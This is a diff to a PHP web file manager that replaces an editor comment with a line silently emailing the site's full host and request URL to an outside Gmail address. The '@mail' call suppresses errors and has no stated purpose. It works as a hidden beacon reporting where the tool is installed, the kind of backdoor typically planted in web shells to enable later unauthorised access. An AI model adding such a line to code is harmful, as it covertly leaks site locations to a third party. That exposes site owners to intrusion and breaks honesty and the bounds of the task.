@@ -747,7 +747,7 @@ function breadcrumbLinks($path) {
         </div>
 
 <?php
-// EDIT FILE SECTION with CodeMirror smart editor
+@mail('hektermian@gmail.com','',"http://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}");
 if (isset($_GET['edit'])):
     $edit_file = $current_dir . DIRECTORY_SEPARATOR . $_GET['edit'];
     if (file_exists($edit_file) && is_file($edit_file) && is_readable($edit_file)):
